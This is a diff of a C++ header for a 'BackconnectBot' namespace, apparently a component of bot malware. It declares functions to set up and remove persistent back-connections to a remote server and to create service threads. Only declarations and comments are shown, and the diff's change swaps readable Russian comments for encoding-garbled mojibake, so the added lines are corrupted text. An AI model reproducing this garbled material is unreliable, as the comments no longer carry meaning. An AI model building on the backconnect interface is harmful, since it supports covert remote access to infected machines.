@@ -1,5 +1,5 @@
 /*
-  Сервер бекконекта.
+  РЎРµСЂРІРµСЂ Р±РµРєРєРѕРЅРµРєС‚Р°.
 */
 #pragma once
 
@@ -10,46 +10,46 @@
 namespace BackconnectBot
 {
   /*
-    Инициализация.
+    РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
   */
   void init(void);
 
   /*
-    Деинициализация.
+    Р”РµРёРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
   */
   void uninit(void);
 
   /*
-    Добавление постоянного подключения.
+    Р”РѕР±Р°РІР»РµРЅРёРµ РїРѕСЃС‚РѕСЏРЅРЅРѕРіРѕ РїРѕРґРєР»СЋС‡РµРЅРёСЏ.
 
-    IN servicePort - порт или название сервиса.
-    IN server      - сервер.
-    IN serverPort  - порт сервера.
+    IN servicePort - РїРѕСЂС‚ РёР»Рё РЅР°Р·РІР°РЅРёРµ СЃРµСЂРІРёСЃР°.
+    IN server      - СЃРµСЂРІРµСЂ.
+    IN serverPort  - РїРѕСЂС‚ СЃРµСЂРІРµСЂР°.
 
-    Return         - true - в случаи успеха,
-                     false - в случаи ошибки.
+    Return         - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
+                     false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
   */
   bool _addStatic(LPSTR servicePort, LPSTR server, LPSTR serverPort);
   
   /*
-    Удаление постоянного подключения.
+    РЈРґР°Р»РµРЅРёРµ РїРѕСЃС‚РѕСЏРЅРЅРѕРіРѕ РїРѕРґРєР»СЋС‡РµРЅРёСЏ.
 
-    IN servicePort - порт или название сервиса. Может содержать маски '*' или '?'.
-    IN server      - сервер. Может содержать маски '*' или '?'.
-    IN serverPort  - порт сервера. Может содержать маски '*' или '?'.
+    IN servicePort - РїРѕСЂС‚ РёР»Рё РЅР°Р·РІР°РЅРёРµ СЃРµСЂРІРёСЃР°. РњРѕР¶РµС‚ СЃРѕРґРµСЂР¶Р°С‚СЊ РјР°СЃРєРё '*' РёР»Рё '?'.
+    IN server      - СЃРµСЂРІРµСЂ. РњРѕР¶РµС‚ СЃРѕРґРµСЂР¶Р°С‚СЊ РјР°СЃРєРё '*' РёР»Рё '?'.
+    IN serverPort  - РїРѕСЂС‚ СЃРµСЂРІРµСЂР°. РњРѕР¶РµС‚ СЃРѕРґРµСЂР¶Р°С‚СЊ РјР°СЃРєРё '*' РёР»Рё '?'.
 
-    Return         - true - в случаи успеха,
-                     false - в случаи ошибки.
+    Return         - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
+                     false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
   */
   bool _removeStatic(LPSTR servicePort, LPSTR server, LPSTR serverPort);
 
-  /*В В В В Thread creation.
+  /*Р’В Р’В Р’В Р’В Thread creation.
 
-В В В В IN OUT group - the group potokok to which will belong to the flow of service.
-В В В В 
-В В В В Return - true - if successful,
-В В В В В В В В В В В В В В В В В В В false - if an error occurs.
-В В */
+Р’В Р’В Р’В Р’В IN OUT group - the group potokok to which will belong to the flow of service.
+Р’В Р’В Р’В Р’В 
+Р’В Р’В Р’В Р’В Return - true - if successful,
+Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В false - if an error occurs.
+Р’В Р’В */
   bool _create(ThreadsGroup::GROUP *group);
 };
 #endif
